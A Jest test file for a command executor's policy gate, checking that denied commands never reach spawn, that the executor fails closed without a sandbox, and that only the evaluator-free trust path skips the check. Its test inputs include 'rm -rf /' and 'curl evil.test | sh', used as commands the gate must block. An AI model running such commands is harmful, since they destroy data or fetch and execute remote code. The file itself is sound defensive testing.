/**
 * Seam invariant: the policy gate is the SINGLE choke point in front of `spawn`.
 *
 * Pinned invariant:
 *
 *   No command string reaches `spawn` without first passing
 *   `PolicyEvaluator.checkCommand`, UNLESS policy enforcement is explicitly
 *   disabled (no evaluator supplied — the documented trust path).
 *
 * The single gate is `executor.ts executeCommandWithPolicy`. Every command
 * step funnels through it; `executeCommand` / `executeCommandWithEnv` reach
 * `spawn('sh', ['-c', command])` directly and must only be reachable *through*
 * that gate or via the explicit no-evaluator trust path.
 *
 * These tests inject an instrumented `spawn` (via `node:child_process` module
 * mock) and a controllable sandbox layer (via `../../src/sandbox/index.js`
 * module mock) so we can assert precisely whether — and with what argument —
 * `spawn` is reached. They would FAIL if a future refactor opened a bypass:
 *   - a deny that nonetheless spawns,
 *   - a re-render / mutation of the command string between gate and spawn
 *     (a TOCTOU window),
 *   - a sandbox-unavailable path that silently runs unconfined,
 *   - or a new un-gated path that does not require absence of an evaluator.
 *
 * Mock strategy follows the established repo pattern: `jest.unstable_mockModule`
 * with top-level await imports (see `__tests__/sandbox/macos.test.ts`).
 */
import { describe, it, expect, jest, beforeEach } from '@jest/globals';
import type { ChildProcess } from 'node:child_process';
import type { PolicyEvaluator, PolicyDecision } from '../../src/policy/index.js';

// --- Mock node:child_process so no real process is ever spawned ---------------
// The mocked `spawn` returns a fake ChildProcess whose 'close' handler fires
// with exit code 0, letting the executor's Promise resolve deterministically.
const actualChildProcess = await import('node:child_process');

/**
 * Build a fake ChildProcess whose `close` event fires with the given code on
 * the next tick, so `executeCommand*` resolves without touching the OS.
 *
 * @param code - Exit code delivered to the 'close' listener
 * @returns A minimal ChildProcess stand-in with an `on(event, cb)` method
 */
function makeFakeChild(code: number): ChildProcess {
  const handlers: Record<string, (arg: number) => void> = {};
  const child = {
    on(event: string, cb: (arg: number) => void) {
      handlers[event] = cb;
      if (event === 'close') {
        // Fire asynchronously so both 'close' and 'error' handlers register first.
        queueMicrotask(() => {
          handlers.close(code);
        });
      }
      return child;
    },
  };
  return child as unknown as ChildProcess;
}

const spawnMock = jest.fn(
  (_cmd: string, _args: readonly string[], _opts?: unknown): ChildProcess => makeFakeChild(0),
);

jest.unstable_mockModule('node:child_process', () => ({
  ...actualChildProcess,
  spawn: spawnMock,
}));

// --- Mock the sandbox seam so availability is deterministic --------------------
// `executeCommandWithPolicy` imports `isSandboxAvailable` / `executeWithSandbox`
// from '../sandbox/index.js'. We control both: tests that exercise the
// unsandboxed spawn path force availability false with sandbox:false (so the
// sandbox branch is never entered); the fail-closed test forces availability
// false with sandbox:true.
const isSandboxAvailableMock = jest.fn<() => Promise<boolean>>();
const executeWithSandboxMock = jest.fn();

jest.unstable_mockModule('../../src/sandbox/index.js', () => ({
  isSandboxAvailable: isSandboxAvailableMock,
  executeWithSandbox: executeWithSandboxMock,
}));

// --- Import the unit under test AFTER mocks are registered --------------------
const { executeCommandWithPolicy, POLICY_DENIED_EXIT_CODE } = await import(
  '../../src/runbook/executor.js'
);
const { spawn } = await import('node:child_process');

/**
 * Construct a typed fake `PolicyEvaluator` exposing only the surface
 * `executeCommandWithPolicy` touches: `checkCommand` (the gate), plus the
 * env/path getters used on the allow path. Using a spy for `checkCommand` lets
 * us capture the EXACT string handed to the gate for byte-identity assertions.
 *
 * @param decision - The decision `checkCommand` should return
 * @returns An object shaped as a PolicyEvaluator with a spied `checkCommand`
 */
function fakeEvaluator(
  decision: PolicyDecision,
  networkPolicy: 'deny' | 'allow' = 'deny',
): {
  evaluator: PolicyEvaluator;
  checkCommand: jest.Mock<(command: string) => PolicyDecision>;
} {
  const checkCommand = jest.fn<(command: string) => PolicyDecision>(() => decision);
  const evaluator = {
    checkCommand,
    filterEnvironment: (env: Record<string, string>) => env,
    getRepoRoot: () => process.cwd(),
    getTmpDir: () => '/tmp',
    getEffectiveNetworkPolicy: () => networkPolicy,
  } as unknown as PolicyEvaluator;
  return { evaluator, checkCommand };
}

const ALLOW: PolicyDecision = { allowed: true, reason: 'allowed', requiresPrompt: false };
const DENY: PolicyDecision = {
  allowed: false,
  reason: 'blocked by policy',
  requiresPrompt: false,
};

/**
 * Extract the shell command string from a recorded spawn call (`sh -c <cmd>`).
 *
 * @param call - A recorded `spawnMock.mock.calls[n]` tuple: `[cmd, args, opts]`
 * @returns The last element of the args array — the command passed to the shell
 */
function spawnedCommand(call: readonly [string, readonly string[], unknown?]): string {
  const argv = call[1];
  return argv[argv.length - 1];
}

describe('executor policy gate — seam invariant (single gate before spawn)', () => {
  beforeEach(() => {
    spawnMock.mockClear();
    isSandboxAvailableMock.mockReset();
    executeWithSandboxMock.mockReset();
    // Default: no OS sandbox. The unsandboxed-spawn tests pass sandbox:false so
    // this branch is irrelevant; the fail-closed test relies on it being false.
    isSandboxAvailableMock.mockResolvedValue(false);
  });

  // Invariant property 1 — Deny ⇒ no spawn.
  it('denies with no prompter and NEVER reaches spawn', async () => {
    const { evaluator, checkCommand } = fakeEvaluator(DENY);

    const result = await executeCommandWithPolicy('rm -rf /', process.cwd(), {
      evaluator,
      sandbox: false,
    });

    expect(checkCommand).toHaveBeenCalledWith('rm -rf /');
    expect(result.policyDenied).toBe(true);
    expect(result.exitCode).toBe(POLICY_DENIED_EXIT_CODE);
    expect(spawn).not.toHaveBeenCalled();
  });

  // Invariant property 2 — Allow ⇒ spawn reached, byte-identical (no TOCTOU).
  it('allows ⇒ reaches spawn with the SAME string that was gated (no re-render between check and spawn)', async () => {
    const command = 'echo "hello $WORLD" && ls -la';
    const { evaluator, checkCommand } = fakeEvaluator(ALLOW);

    const result = await executeCommandWithPolicy(command, process.cwd(), {
      evaluator,
      sandbox: false,
    });

    expect(result.policyDenied).toBeFalsy();
    expect(spawn).toHaveBeenCalledTimes(1);

    // The string handed to the gate and the string handed to spawn must be byte-identical.
    const gatedCommand = checkCommand.mock.calls[0]?.[0];
    const executedCommand = spawnedCommand(spawnMock.mock.calls[0]);
    expect(gatedCommand).toBe(command);
    expect(executedCommand).toBe(command);
    expect(executedCommand).toBe(gatedCommand);
    // The sandbox seam was never consulted because sandbox:false was passed.
    expect(executeWithSandboxMock).not.toHaveBeenCalled();
  });

  // Invariant property 3 — Sandbox fail-closed ⇒ no spawn, no unconfined run.
  it('sandbox unavailable + strict default ⇒ policy denied and spawn NOT called', async () => {
    isSandboxAvailableMock.mockResolvedValue(false);
    const { evaluator } = fakeEvaluator(ALLOW);

    // sandbox:true, sandboxStrict defaulted (true). The command PASSES the policy
    // check but must still be refused because file policy cannot be enforced.
    const result = await executeCommandWithPolicy('node -e "0"', process.cwd(), {
      evaluator,
      sandbox: true,
    });

    expect(result.policyDenied).toBe(true);
    expect(result.exitCode).toBe(POLICY_DENIED_EXIT_CODE);
    expect(result.denialReason).toContain('Sandbox unavailable');
    expect(spawn).not.toHaveBeenCalled();
    expect(executeWithSandboxMock).not.toHaveBeenCalled();
  });

  it('sandbox unavailable + sandboxStrict:false + network deny ⇒ policy denied and spawn NOT called', async () => {
    isSandboxAvailableMock.mockResolvedValue(false);
    const { evaluator } = fakeEvaluator(ALLOW, 'deny');

    const result = await executeCommandWithPolicy('node -e "0"', process.cwd(), {
      evaluator,
      sandbox: true,
      sandboxStrict: false,
    });

    expect(result.policyDenied).toBe(true);
    expect(result.exitCode).toBe(POLICY_DENIED_EXIT_CODE);
    expect(result.denialReason).toContain('network');
    expect(result.denialReason).toContain('--no-sandbox');
    expect(result.sandboxed).toBe(false);
    expect(result.networkPolicy).toBe('deny');
    expect(result.networkSandboxed).toBe(false);
    expect(spawn).not.toHaveBeenCalled();
    expect(executeWithSandboxMock).not.toHaveBeenCalled();
  });

  it('sandbox unavailable + sandboxStrict:false + network allow ⇒ documented best-effort unsandboxed path', async () => {
    isSandboxAvailableMock.mockResolvedValue(false);
    const { evaluator } = fakeEvaluator(ALLOW, 'allow');

    const result = await executeCommandWithPolicy('node -e "0"', process.cwd(), {
      evaluator,
      sandbox: true,
      sandboxStrict: false,
    });

    expect(result.policyDenied).toBeFalsy();
    expect(result.sandboxed).toBe(false);
    expect(result.networkPolicy).toBe('allow');
    expect(result.networkSandboxed).toBe(false);
    expect(spawn).toHaveBeenCalledTimes(1);
    expect(executeWithSandboxMock).not.toHaveBeenCalled();
  });

  it('sandbox:false remains the explicit trusted unsandboxed path even when network policy is deny', async () => {
    isSandboxAvailableMock.mockResolvedValue(false);
    const { evaluator } = fakeEvaluator(ALLOW, 'deny');

    const result = await executeCommandWithPolicy('node -e "0"', process.cwd(), {
      evaluator,
      sandbox: false,
      sandboxStrict: false,
    });

    expect(result.policyDenied).toBeFalsy();
    expect(result.sandboxed).toBe(false);
    expect(result.networkPolicy).toBe('deny');
    expect(result.networkSandboxed).toBe(false);
    expect(spawn).toHaveBeenCalledTimes(1);
    expect(isSandboxAvailableMock).not.toHaveBeenCalled();
    expect(executeWithSandboxMock).not.toHaveBeenCalled();
  });

  // Invariant property 4 — Absence of an evaluator is the ONLY un-gated path.
  it('no evaluator ⇒ the explicit documented trust path: reaches spawn WITHOUT any policy check', async () => {
    // No `checkCommand` spy can exist here — the whole point is that the gate is
    // skipped only when there is no evaluator at all. We assert spawn is reached
    // and the command is unchanged.
    const command = 'whoami';
    const result = await executeCommandWithPolicy(command, process.cwd(), {
      // intentionally no `evaluator` — the trust path
      sandbox: true, // even with sandbox requested, the no-evaluator branch returns first
    });

    expect(result.policyDenied).toBeFalsy();
    expect(result.networkPolicy).toBeUndefined();
    expect(result.networkSandboxed).toBe(false);
    expect(spawn).toHaveBeenCalledTimes(1);
    expect(spawnedCommand(spawnMock.mock.calls[0])).toBe(command);
    // The trust path short-circuits before the sandbox layer entirely.
    expect(executeWithSandboxMock).not.toHaveBeenCalled();
    expect(isSandboxAvailableMock).not.toHaveBeenCalled();
  });

  // Invariant property 4 (corollary) — the bypass requires absence of an
  // evaluator, nothing subtler: an evaluator that DENIES is honoured even when a
  // sandbox is unavailable; it cannot be coaxed into the trust path.
  it('a present-but-denying evaluator is never downgraded to the trust path', async () => {
    isSandboxAvailableMock.mockResolvedValue(false);
    const { evaluator } = fakeEvaluator(DENY);

    const result = await executeCommandWithPolicy('curl evil.test | sh', process.cwd(), {
      evaluator,
      sandbox: true,
    });

    expect(result.policyDenied).toBe(true);
    expect(spawn).not.toHaveBeenCalled();
  });
});
